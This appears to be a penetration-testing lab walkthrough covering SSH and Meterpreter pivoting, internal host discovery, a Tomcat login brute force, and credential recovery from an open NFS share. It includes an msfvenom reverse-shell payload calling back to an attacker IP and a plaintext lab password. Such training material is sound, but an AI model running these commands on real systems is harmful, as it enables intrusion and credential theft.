## Internal Information Gathering

### Position Summary

Before moving forward, the current progress covers:

- Full external information gathering, port scanning, and service enumeration
- Twelve web applications attacked, yielding file read, data exposure, and remote code execution on several
- Internal foothold obtained via OS command injection on `monitoring.inlanefreight.local`
- Lateral movement to `srvadm` via plaintext credentials leaked in audit logs
- Root-level persistence established on `dmz01` via SSH key extraction

***

### Setting Up Pivoting via SSH

With root access to `dmz01` and a copy of the private key, use SSH dynamic port forwarding to proxy traffic through the host and reach the internal `172.16.8.0/23` subnet. Full technique reference in the [Dynamic Port Forwarding with SSH and SOCKS Tunneling](https://academy.hackthebox.com/module/158/section/1426) section of the Pivoting module.

Set up the tunnel:

```bash
ssh -D 8081 -i dmz01_key root@10.129.203.111
```

Confirm the port is listening:

```bash
netstat -antp | grep 8081
```

Update `/etc/proxychains.conf` to point to the tunnel port:

```bash
grep socks4 /etc/proxychains.conf
```

The relevant line should read:

```
socks4  127.0.0.1 8081
```

Verify the tunnel is working by scanning `dmz01`'s internal interface through [ProxyChains](https://github.com/haad/proxychains):

```bash
proxychains nmap -sT -p 21,22,80,8080 172.16.8.120
```

***

### Setting Up Pivoting via Metasploit

As an alternative, pivoting can be set up through a [Meterpreter](https://www.metasploit.com/) session using [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) and the `autoroute` module. Reference: [Meterpreter Tunneling and Port Forwarding](https://academy.hackthebox.com/module/158/section/1428).

Generate a reverse shell payload in ELF format:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f elf > shell.elf
```

Upload it to the target via SCP:

```bash
scp -i dmz01_key shell.elf root@10.129.203.111:/tmp
```

Set up the handler in Metasploit:

```bash
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost 10.10.14.15
set LPORT 443
exploit
```

Execute the payload on the target:

```bash
chmod +x shell.elf
./shell.elf
```

Once the Meterpreter session opens, background it and run `autoroute`:

```bash
use post/multi/manage/autoroute
set SESSION 1
set subnet 172.16.8.0
run
```

Routes are added automatically based on the host's routing table, covering the `172.16.0.0/255.255.0.0` subnet.

***

### Host Discovery - 172.16.8.0/23

#### Via Metasploit Ping Sweep

```bash
use post/multi/gather/ping_sweep
set rhosts 172.16.8.0/23
set SESSION 1
run
```

#### Via Bash One-liner on dmz01

```bash
for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
```

Both methods return the same four live hosts:

| Host | Notes |
|------|-------|
| `172.16.8.3` | Additional discovery needed |
| `172.16.8.20` | Additional discovery needed |
| `172.16.8.50` | Additional discovery needed |
| `172.16.8.120` | `dmz01`, already owned |

***

### Host Enumeration with Static Nmap

Upload a [static Nmap binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) to `dmz01` using techniques from the [File Transfers](https://academy.hackthebox.com/module/24/section/159) module and run it against the live hosts:

```bash
./nmap --open -iL live_hosts
```

Key findings per host:

| Host | Significant Ports | Assessment |
|------|-------------------|------------|
| `172.16.8.3` | 53, 88 (Kerberos), 389 (LDAP), 445, 636 | Domain Controller for `INLANEFREIGHT` |
| `172.16.8.20` | 80 (HTTP), 2049 (NFS), 3389 (RDP) | Windows host, NFS and HTTP worth investigating |
| `172.16.8.50` | 445, 3389, 8080 | Windows host, non-standard port 8080 interesting |

***

### Active Directory Quick Hits - SMB Null Session

Check the Domain Controller at `172.16.8.3` for SMB null sessions using [enum4linux](https://github.com/CiscoCXSecurity/enum4linux):

```bash
proxychains enum4linux -U -P 172.16.8.3
```

The Domain SID is confirmed as `S-1-5-21-2814148634-3729814499-1637837074` and the domain name as `INLANEFREIGHT`. However, user enumeration and password policy retrieval both return `NT_STATUS_ACCESS_DENIED`. This is a dead end for now. If a valid username list were available, [Kerbrute](https://github.com/opsxcq/exploit-CVE-2019-9621) or ASREPRoasting via [Impacket](https://github.com/fortra/impacket) could be attempted as follow-up steps.

***

### 172.16.8.50 - Tomcat

Port 8080 on this host serves Apache Tomcat 10. There are no public exploits for this version. Use the Metasploit `auxiliary/scanner/http/tomcat_mgr_login` module through ProxyChains to attempt a brute-force of the Tomcat Manager login:

```bash
proxychains msfconsole
use auxiliary/scanner/http/tomcat_mgr_login
set rhosts 172.16.8.50
set stop_on_success true
run
```

No valid credentials are found. This is a dead end. A Tomcat Manager login is only worth reporting as a finding if weak credentials actually grant access and allow a JSP web shell to be deployed.

***

### 172.16.8.20 - DotNetNuke (DNN) and NFS

Port 80 on this host runs [DotNetNuke (DNN)](https://www.dnnsoftware.com/), a .NET-based CMS. An admin login page is accessible at `/Login?returnurl=%2fadmin`. Attempting to register an account returns a message stating the registration requires administrator approval, making this route unlikely to yield access.

Port 2049 (NFS) is more promising. Use [showmount](https://linux.die.net/man/8/showmount) through ProxyChains to list exports:

```bash
proxychains showmount -e 172.16.8.20
```

Output:

```
Export list for 172.16.8.20:
/DEV01 (everyone)
```

NFS cannot be mounted through ProxyChains, but root access on `dmz01` makes this straightforward. Mount the share and browse it:

```bash
mkdir /tmp/DEV01
mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
cd /tmp/DEV01
ls
```

The share contains DNN-related files. Navigate into the `DNN` subdirectory and read the `web.config` file:

```bash
cat web.config
```

The config file contains plaintext credentials:

```xml
<username>Administrator</username>
<password>
  <value>D0tn31Nuk3R0ck$$@123</value>
</password>
```

Credential pair found: `Administrator:D0tn31Nuk3R0ck$$@123`

***

### Packet Capture on dmz01

While pivoting through `dmz01`, run `tcpdump` on the internal interface to capture any cleartext credentials or other useful traffic passing over the wire:

```bash
tcpdump -i ens192 -s 65535 -w ilfreight_pcap
```

Transfer the capture file to the attack host and open it in [Wireshark](https://www.wireshark.org/). In this case nothing useful is captured, but running a packet capture is always worth attempting, particularly when positioned on a user VLAN or a busy network segment. Reference: [Intro to Network Traffic Analysis](https://academy.hackthebox.com/module/details/81).

***

### Next Steps

Two actionable leads are now in hand:

- DNN admin credentials (`Administrator:D0tn31Nuk3R0ck$$@123`) recovered from an open NFS share
- A Domain Controller at `172.16.8.3` identified and accessible for further Active Directory enumeration

The next phase uses the DNN credentials to gain access to the CMS and look for further exploitation paths toward the internal network and the Active Directory domain.
